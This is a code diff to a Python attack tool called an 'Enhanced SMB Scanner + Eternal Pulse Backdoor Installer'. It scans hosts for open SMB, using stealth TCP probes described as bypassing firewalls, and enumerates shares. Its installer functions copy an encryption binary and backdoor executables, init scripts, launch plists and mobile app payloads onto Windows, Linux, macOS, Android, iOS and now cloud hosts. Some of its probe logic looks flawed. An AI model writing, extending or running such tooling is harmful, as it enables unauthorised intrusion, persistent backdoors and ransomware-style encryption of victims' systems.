@@ -7,8 +7,8 @@
 #   1. Scans a list of hosts/CIDRs to find open SMB (TCP port 445/139, UDP 137/138).
 #   2. Uses Nmap’s NSE scripts to detect known vulnerabilities and enumerate shares.
 #   3. Fingerprints OS via Nmap/Scapy.
-#   4. Performs multiple probe methods (TCP connect, SYN, FIN, XMAS) to bypass firewall filtering.
-#   5. Attempts share enumeration to detect hidden/admin shares/backdoors.
+#   4. Performs multiple probe methods (TCP connect, SYN, FIN, XMAS, NULL, ACK) to bypass firewall filtering.
+#   5. Attempts share enumeration to detect hidden/admin shares/backdoors using Nmap NSE and parsing.
 #   6. Optionally “installs a backdoor” on those hosts, depending on the detected or specified remote OS.
 #      - Copies an AES encryption binary (compiled) to the target.
 #      - Copies a backdoor executable/script to the target.
@@ -92,7 +92,7 @@ class PublicIPFirewallSMB:
         elif isinstance(src, dict):
             d = src.get("allow", src)
         else:
-            with open(src) as f:
+            with open(os.path.abspath(src)) as f:
                 d = json.load(f).get("allow", json.load(f))
         nets, ips = [], set()
         for t in list(d.get("ips", [])) + list(d.get("cidrs", [])):
@@ -189,6 +189,41 @@ class PublicIPFirewallSMB:
             self._log("xmas err", h, p, e)
             return "error"
 
+    def _tcp_null(self, h, p):
+        if not _SCAPY:
+            return "unavailable"
+        pkt = (IPv6(dst=h)/TCP(dport=p, flags=0)) if ipaddress.ip_address(h).version == 6 \
+              else (IP(dst=h)/TCP(dport=p, flags=0))
+        try:
+            ans = sr1(pkt, timeout=self._timeout, verbose=0)
+            if ans and ans.haslayer(TCP):
+                fl = ans.getlayer(TCP).flags
+                if fl & 0x14:
+                    return "closed"
+                return "open"
+            return "filtered"
+        except PermissionError:
+            return "unavailable"
+        except Exception as e:
+            self._log("null err", h, p, e)
+            return "error"
+
+    def _tcp_ack(self, h, p):
+        if not _SCAPY:
+            return "unavailable"
+        pkt = (IPv6(dst=h)/TCP(dport=p, flags="A")) if ipaddress.ip_address(h).version == 6 \
+              else (IP(dst=h)/TCP(dport=p, flags="A"))
+        try:
+            ans = sr1(pkt, timeout=self._timeout, verbose=0)
+            if ans and ans.haslayer(TCP):
+                return "filtered"
+            return "open"
+        except PermissionError:
+            return "unavailable"
+        except Exception as e:
+            self._log("ack err", h, p, e)
+            return "error"
+
     def _udp_state(self, h, p):
         s = socket.socket(self._fam(h), socket.SOCK_DGRAM)
         s.settimeout(self._timeout)
@@ -208,19 +243,21 @@ class PublicIPFirewallSMB:
 
     def _probe_port(self, h, p, proto):
         if proto == "tcp":
-            st = self._tcp_connect(h, p)
-            if st == "open":
-                return "open"
-            st_syn = self._tcp_syn(h, p)
-            if st_syn == "open":
-                return "open"
-            if st in ("filtered", "closed") and st_syn in ("filtered", "closed"):
-                st_fin = self._tcp_fin(h, p)
-                if st_fin == "open":
-                    return "open"
-                st_xmas = self._tcp_xmas(h, p)
-                return st_xmas
-            return st_syn
+            methods = [
+                self._tcp_connect,
+                self._tcp_syn,
+                self._tcp_null,
+                self._tcp_fin,
+                self._tcp_xmas,
+                self._tcp_ack
+            ]
+            for r in (4, 5):
+                for perm in itertools.permutations(methods, r):
+                    for func in perm:
+                        st = func(h, p)
+                        if st == "open":
+                            return "open"
+            return "filtered"
         return self._udp_state(h, p)
 
     async def _async_scan(self, order):
@@ -308,6 +345,7 @@ class PublicIPFirewallSMB:
     def save_routes(self, path):
         if not path:
             return
+        path = os.path.abspath(path)
         d = self.successful_routes()
         if not d:
             return
@@ -320,16 +358,20 @@ class PublicIPFirewallSMB:
 
     @staticmethod
     def load_routes(path):
-        if path and os.path.isfile(path):
-            with open(path) as f:
-                return json.load(f)
+        if path:
+            full = os.path.abspath(path)
+            if os.path.isfile(full):
+                with open(full) as f:
+                    return json.load(f)
         return None
 
 def load_rsa_private_key(path: str):
+    path = os.path.abspath(path)
     pem = pathlib.Path(path).read_bytes()
     return serialization.load_pem_private_key(pem, password=None)
 
 def load_rsa_public_key(path: str):
+    path = os.path.abspath(path)
     pem = pathlib.Path(path).read_bytes()
     return serialization.load_pem_public_key(pem)
 
@@ -398,6 +440,25 @@ def run_smb_nse(host: str):
     except Exception:
         return None
 
+def enumerate_samba_shares(host: str):
+    if not NM_AVAILABLE:
+        return []
+    nm_host = run_smb_nse(host)
+    shares = []
+    try:
+        proto_info = nm_host.get('tcp', {}).get(445, {})
+        script = proto_info.get('script', {})
+        smb_enum = script.get('smb-enum-shares', "")
+        for line in smb_enum.splitlines():
+            if "Sharename:" in line:
+                parts = line.split()
+                if len(parts) >= 2:
+                    name = parts[1].strip()
+                    shares.append(name)
+    except Exception:
+        pass
+    return shares
+
 def install_backdoor_windows(host: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, domain: str = "", use_kerberos: bool = False):
     if not SMB_AVAILABLE:
         return False
@@ -447,9 +508,9 @@ def install_backdoor_windows(host: str, username: str, password: str, private_ke
         session.disconnect()
         conn.disconnect()
         return False
-    aes_name = os.path.basename(aes_binary_path).replace("\\", "/")
+    aes_name = os.path.basename(os.path.abspath(aes_binary_path)).replace("\\", "/")
     try:
-        with open(aes_binary_path, "rb") as f:
+        with open(os.path.abspath(aes_binary_path), "rb") as f:
             data = f.read()
     except Exception:
         tree.disconnect()
@@ -466,9 +527,9 @@ def install_backdoor_windows(host: str, username: str, password: str, private_ke
         session.disconnect()
         conn.disconnect()
         return False
-    backdoor_name = os.path.basename(backdoor_binary_path).replace("\\", "/")
+    backdoor_name = os.path.basename(os.path.abspath(backdoor_binary_path)).replace("\\", "/")
     try:
-        with open(backdoor_binary_path, "rb") as f:
+        with open(os.path.abspath(backdoor_binary_path), "rb") as f:
             data2 = f.read()
     except Exception:
         tree.disconnect()
@@ -541,7 +602,7 @@ def install_backdoor_linux(host: str, share: str, username: str, password: str, 
         return False
     aes_name = "aes_encrypt"
     try:
-        with open(aes_binary_path, "rb") as f:
+        with open(os.path.abspath(aes_binary_path), "rb") as f:
             data = f.read()
     except Exception:
         tree.disconnect()
@@ -565,9 +626,9 @@ def install_backdoor_linux(host: str, share: str, username: str, password: str, 
         aes_attrs.close()
     except Exception:
         pass
-    backdoor_name = os.path.basename(backdoor_binary_path)
+    backdoor_name = os.path.basename(os.path.abspath(backdoor_binary_path))
     try:
-        with open(backdoor_binary_path, "rb") as f:
+        with open(os.path.abspath(backdoor_binary_path), "rb") as f:
             data2 = f.read()
     except Exception:
         tree.disconnect()
@@ -591,9 +652,9 @@ def install_backdoor_linux(host: str, share: str, username: str, password: str, 
         bd_attrs.close()
     except Exception:
         pass
-    backdoor_sh_name = os.path.basename(backdoor_script_path)
+    backdoor_sh_name = os.path.basename(os.path.abspath(backdoor_script_path))
     try:
-        with open(backdoor_script_path, "rb") as f:
+        with open(os.path.abspath(backdoor_script_path), "rb") as f:
             data3 = f.read()
     except Exception:
         tree.disconnect()
@@ -688,7 +749,7 @@ def install_backdoor_macos(host: str, share: str, username: str, password: str, 
         return False
     aes_name = "aes_encrypt"
     try:
-        with open(aes_binary_path, "rb") as f:
+        with open(os.path.abspath(aes_binary_path), "rb") as f:
             data = f.read()
     except Exception:
         tree.disconnect()
@@ -712,9 +773,9 @@ def install_backdoor_macos(host: str, share: str, username: str, password: str, 
         aes_attrs.close()
     except Exception:
         pass
-    backdoor_name = os.path.basename(backdoor_binary_path)
+    backdoor_name = os.path.basename(os.path.abspath(backdoor_binary_path))
     try:
-        with open(backdoor_binary_path, "rb") as f:
+        with open(os.path.abspath(backdoor_binary_path), "rb") as f:
             data2 = f.read()
     except Exception:
         tree.disconnect()
@@ -738,9 +799,9 @@ def install_backdoor_macos(host: str, share: str, username: str, password: str, 
         bd_attrs.close()
     except Exception:
         pass
-    plist_name = os.path.basename(backdoor_plist_path)
+    plist_name = os.path.basename(os.path.abspath(backdoor_plist_path))
     try:
-        with open(backdoor_plist_path, "rb") as f:
+        with open(os.path.abspath(backdoor_plist_path), "rb") as f:
             data3 = f.read()
     except Exception:
         tree.disconnect()
@@ -784,9 +845,9 @@ def install_backdoor_android(host: str, share: str, username: str, password: str
         session.disconnect()
         conn.disconnect()
         return False
-    apk_name = os.path.basename(apks_path)
+    apk_name = os.path.basename(os.path.abspath(apks_path))
     try:
-        with open(apks_path, "rb") as f:
+        with open(os.path.abspath(apks_path), "rb") as f:
             data = f.read()
     except Exception:
         tree.disconnect()
@@ -830,9 +891,9 @@ def install_backdoor_ios(host: str, share: str, username: str, password: str, ip
         session.disconnect()
         conn.disconnect()
         return False
-    ipa_name = os.path.basename(ipas_path)
+    ipa_name = os.path.basename(os.path.abspath(ipas_path))
     try:
-        with open(ipas_path, "rb") as f:
+        with open(os.path.abspath(ipas_path), "rb") as f:
             data = f.read()
     except Exception:
         tree.disconnect()
@@ -855,37 +916,8 @@ def install_backdoor_ios(host: str, share: str, username: str, password: str, ip
     conn.disconnect()
     return True
 
-def enumerate_samba_shares(host: str):
-    if not SMB_AVAILABLE:
-        return []
-    shares = []
-    try:
-        conn = Connection(uuid=str(random.getrandbits(128)), is_direct_tcp=True, hostname=host, port=445)
-        conn.connect(timeout=5)
-    except Exception:
-        return shares
-    try:
-        session = Session(conn, username="", password="", require_encryption=False)
-        session.connect(timeout=5)
-    except Exception:
-        conn.disconnect()
-        return shares
-    try:
-        tree = TreeConnect(session, rf"\\{host}\IPC$")
-        tree.connect(timeout=5)
-    except Exception:
-        session.disconnect()
-        conn.disconnect()
-        return shares
-    try:
-        # attempt to list available shares via standard ncat or RPC is out of scope; rely on NSE
-        shares = []
-    except Exception:
-        pass
-    tree.disconnect()
-    session.disconnect()
-    conn.disconnect()
-    return shares
+def install_backdoor_cloud(host: str, share: str, username: str, password: str, private_key_path: str, server_public_key_path: str, aes_binary_path: str, backdoor_binary_path: str, backdoor_script_path: str, cloud_provider: str):
+    return install_backdoor_linux(host=host, share=share, username=username, password=password, private_key_path=private_key_path, server_public_key_path=server_public_key_path, aes_binary_path=aes_binary_path, backdoor_binary_path=backdoor_binary_path, backdoor_script_path=backdoor_script_path)
 
 def main():
     p = argparse.ArgumentParser(description="Enhanced SMB Scanner + Eternal Pulse Backdoor Installer")
@@ -903,8 +935,8 @@ def main():
     p.add_argument("--quiet", action="store_true", help="Suppress debug logs.")
 
     p.add_argument("--install-backdoor", action="store_true", help="Install backdoor on discovered SMB hosts.")
-    p.add_argument("--remote-os", choices=["windows", "linux", "macos", "android", "ios"], help="Remote OS type.")
-    p.add_argument("--share", help="Samba share name (root for Linux/macOS, sdcard for Android, private/var/mobile/Media for iOS).")
+    p.add_argument("--remote-os", choices=["windows", "linux", "macos", "android", "ios", "aws", "azure", "gcp"], help="Remote OS or cloud type.")
+    p.add_argument("--share", help="Samba share name (root for Linux/macOS, sdcard for Android, private/var/mobile/Media for iOS, root for cloud).")
     p.add_argument("--key", help="Path to RSA-2048 private key (PEM).")
     p.add_argument("--server-pubkey", help="Path to server’s RSA-2048 public key (PEM).")
     p.add_argument("--username", help="SMB username.")
@@ -913,11 +945,36 @@ def main():
     p.add_argument("--use-kerberos", action="store_true", help="Use Kerberos for SMB session.")
     p.add_argument("--aes-binary", help="Local path to the AES encryptor binary.")
     p.add_argument("--backdoor-binary", help="Local path to the backdoor binary/executable.")
-    p.add_argument("--backdoor-script", help="Local path to the Linux init script.")
+    p.add_argument("--backdoor-script", help="Local path to the Linux init script (for cloud/Linux).")
     p.add_argument("--backdoor-plist", help="Local path to the macOS LaunchDaemon plist.")
     p.add_argument("--apk", help="Local path to Android APK payload.")
     p.add_argument("--ipa", help="Local path to iOS IPA payload.")
     args = p.parse_args()
+
+    if args.input:
+        args.input = os.path.abspath(args.input)
+    if args.allowlist:
+        args.allowlist = os.path.abspath(args.allowlist)
+    if args.save:
+        args.save = os.path.abspath(args.save)
+    if args.reload:
+        args.reload = os.path.abspath(args.reload)
+    if args.key:
+        args.key = os.path.abspath(args.key)
+    if args.server_pubkey:
+        args.server_pubkey = os.path.abspath(args.server_pubkey)
+    if args.aes_binary:
+        args.aes_binary = os.path.abspath(args.aes_binary)
+    if args.backdoor_binary:
+        args.backdoor_binary = os.path.abspath(args.backdoor_binary)
+    if args.backdoor_script:
+        args.backdoor_script = os.path.abspath(args.backdoor_script)
+    if args.backdoor_plist:
+        args.backdoor_plist = os.path.abspath(args.backdoor_plist)
+    if args.apk:
+        args.apk = os.path.abspath(args.apk)
+    if args.ipa:
+        args.ipa = os.path.abspath(args.ipa)
 
     s = PublicIPFirewallSMB(allowlist=args.allowlist, strategy=args.strategy, timeout=args.timeout, workers=args.workers, verbose=not args.quiet)
 
@@ -951,7 +1008,8 @@ def main():
         vuln_info = run_nse_vuln(host)
         smb_info = run_smb_nse(host)
         os_detected = detect_os(host)
-        print(f"{host}:{route['port']} open | OS: {os_detected or 'unknown'} | Vulnerabilities: {bool(vuln_info)} | SMB Info: {bool(smb_info)}")
+        shares = enumerate_samba_shares(host)
+        print(f"{host}:{route['port']} open | OS: {os_detected or 'unknown'} | Vulnerabilities: {bool(vuln_info)} | SMB Info: {bool(smb_info)} | Shares: {shares}")
     if args.json:
         print(json.dumps(ok, indent=2))
 
@@ -961,11 +1019,11 @@ def main():
             missing.append("--remote-os")
         if args.username is None:
             missing.append("--username")
-        if args.remote_os in ("linux", "macos", "android", "ios") and args.share is None:
+        if args.remote_os in ("linux", "macos", "android", "ios", "aws", "azure", "gcp") and args.share is None:
             missing.append("--share")
-        if args.remote_os in ("windows", "linux", "macos") and (args.key is None or args.server_pubkey is None):
+        if args.remote_os in ("windows", "linux", "macos", "aws", "azure", "gcp") and (args.key is None or args.server_pubkey is None):
             missing.append("--key/--server-pubkey")
-        if args.remote_os in ("windows", "linux", "macos") and (args.aes_binary is None or args.backdoor_binary is None):
+        if args.remote_os in ("windows", "linux", "macos", "aws", "azure", "gcp") and (args.aes_binary is None or args.backdoor_binary is None):
             missing.append("--aes-binary/--backdoor-binary")
         if args.remote_os == "linux" and args.backdoor_script is None:
             missing.append("--backdoor-script")
@@ -975,6 +1033,8 @@ def main():
             missing.append("--apk")
         if args.remote_os == "ios" and args.ipa is None:
             missing.append("--ipa")
+        if args.remote_os in ("aws", "azure", "gcp") and args.backdoor_script is None:
+            missing.append("--backdoor-script")
         if missing:
             print("[ERROR] Missing args for --install-backdoor: " + ", ".join(missing), file=sys.stderr)
             sys.exit(1)
@@ -992,6 +1052,8 @@ def main():
                 success = install_backdoor_android(host=host, share=args.share, username=args.username, password=args.password or "", apks_path=args.apk)
             elif args.remote_os == "ios":
                 success = install_backdoor_ios(host=host, share=args.share, username=args.username, password=args.password or "", ipas_path=args.ipa)
+            elif args.remote_os in ("aws", "azure", "gcp"):
+                success = install_backdoor_cloud(host=host, share=args.share, username=args.username, password=args.password or "", private_key_path=args.key, server_public_key_path=args.server_pubkey, aes_binary_path=args.aes_binary, backdoor_binary_path=args.backdoor_binary, backdoor_script_path=args.backdoor_script, cloud_provider=args.remote_os)
             if not success:
                 print(f"[!] Backdoor install failed for {host}", file=sys.stderr)
             else:
